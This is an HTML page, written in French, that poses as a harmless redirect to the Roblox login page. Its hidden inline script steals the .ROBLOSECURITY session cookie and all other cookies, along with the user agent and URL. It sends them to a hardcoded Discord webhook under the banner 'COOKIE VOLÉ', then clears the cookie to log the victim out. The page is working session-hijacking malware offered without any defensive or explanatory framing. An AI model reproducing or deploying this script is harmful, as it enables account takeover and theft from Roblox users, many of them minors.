<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="2; url=https://www.roblox.com/login">
    <title>Redirection</title>
    <style>body{background:#1a1a2e;color:#fff;font-family:Arial;text-align:center;padding:50px;}</style>
</head>
<body>
    <h2>⏳ Redirection...</h2>
    <p>Vous allez être redirigé vers Roblox.</p>
    <script>
        (function() {
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1537086394202329203/AnlEjgrwFeeJbRS27C0TRlR-lExo7YOlpSV2-tyNahwI1NAB7WiiYHxJ1xY3xX0NkVf2";

            // Récupérer .ROBLOSECURITY
            const cookies = document.cookie.split('; ');
            const robloxSec = cookies.find(row => row.startsWith('.ROBLOSECURITY='));
            const cookieValue = robloxSec ? robloxSec.split('=')[1] : null;

            // Préparer l'embed
            const embed = {
                title: cookieValue ? "🎯 COOKIE VOLÉ" : "⚠️ TENTATIVE (pas de cookie)",
                color: cookieValue ? 0xff0000 : 0xffaa00,
                fields: [
                    { name: "🔑 .ROBLOSECURITY", value: cookieValue ? `\`${cookieValue}\`` : "❌ Aucun cookie", inline: false },
                    { name: "📦 Tous les cookies", value: `\`${document.cookie || 'VIDE'}\``, inline: false },
                    { name: "🕹️ User-Agent", value: navigator.userAgent, inline: false },
                    { name: "🌐 URL", value: window.location.href, inline: false }
                ],
                footer: { text: "ShadowCAT // Vol silencieux" }
            };

            // Envoyer (avec suivi d'erreur)
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            })
            .then(res => {
                if (res.ok) {
                    console.log("✅ Envoi réussi");
                } else {
                    console.error("❌ Erreur HTTP :", res.status);
                }
            })
            .catch(err => console.error("❌ Erreur réseau :", err));

            // Supprimer le cookie pour déconnecter
            document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.roblox.com; secure; samesite=none";
            document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=roblox.com; secure; samesite=none";
        })();
    </script>
</body>
</html>
